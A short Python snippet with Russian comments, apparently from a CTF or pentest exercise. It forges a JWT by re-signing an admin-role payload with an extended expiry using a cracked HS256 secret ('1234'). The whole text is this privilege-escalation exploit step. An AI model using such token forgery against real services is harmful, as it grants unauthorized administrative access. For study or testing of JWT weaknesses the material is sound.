import jwt
''' Генерация JWT токена '''
new_payload = {
  "sub": "...",  # Изменённое имя пользователя
  "role": "admin",
  "exp": 99999999999,  # Увеличенный срок действия
  "jti": "...", # новый jti
  "type": "access"
}
new_token = jwt.encode(new_payload, "1234", algorithm="HS256")
print(new_token)
#найденный вами пароль